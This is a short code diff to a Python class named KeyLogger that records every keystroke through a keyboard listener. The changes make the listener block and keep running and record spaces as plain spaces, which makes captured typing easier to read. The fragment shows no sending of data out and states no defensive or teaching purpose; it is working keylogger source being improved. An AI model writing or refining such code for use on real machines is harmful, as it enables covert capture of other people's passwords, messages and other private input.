@@ -9,9 +9,13 @@ class KeyLogger:
     def key_logger_service(self):
         listener = keyboard.Listener(on_press=self.on_press)
         listener.start()
+        listener.join()
 
     def on_press(self, key):
         try:
             self.logger += key.char
         except AttributeError:
-            self.logger += str(key)
+            if key == keyboard.Key.space:
+                self.logger += " "
+            else:
+                self.logger += str(key)
